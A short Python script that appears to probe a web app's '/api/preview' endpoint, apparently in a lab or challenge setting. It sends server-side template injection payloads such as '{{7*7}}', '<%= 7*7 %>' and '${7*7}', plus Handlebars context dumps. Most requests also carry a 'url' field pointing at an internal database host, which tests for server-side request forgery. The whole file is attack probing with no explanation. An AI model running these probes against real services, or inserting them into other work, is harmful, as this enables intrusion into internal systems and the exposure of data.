import urllib.request, urllib.error, json
BASE='https://<host>/fireburned-2'
def post(path,obj):
    data=json.dumps(obj).encode()
    r=urllib.request.Request(BASE+path,data=data,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},method='POST')
    try:
        resp=urllib.request.urlopen(r,timeout=20); body=resp.read(); code=resp.status
    except urllib.error.HTTPError as e:
        body=e.read(); code=e.code
    except Exception as e:
        return 'ERR '+str(e)
    return '%s %s'%(code,body[:800].decode('latin1','replace'))
cases=[
 {'template':'HELLO'},
 {'template':'{{7*7}}'},
 {'url':'http://fireburned--db:8080/health','template':'HELLO'},
 {'url':'http://fireburned--db:8080/health','template':'{{7*7}}'},
 {'url':'http://fireburned--db:8080/health','template':'<%= 7*7 %>'},
 {'url':'http://fireburned--db:8080/health','template':'${7*7}'},
 {'url':'http://fireburned--db:8080/health','template':'#{7*7}'},
 {'url':'http://fireburned--db:8080/health','template':'{{this}}'},
 {'url':'http://fireburned--db:8080/health','template':'{{#each this}}{{@key}}={{this}}{{/each}}'},
]
for c in cases:
    print('===',json.dumps(c)[:150])
    print(post('/api/preview',c))
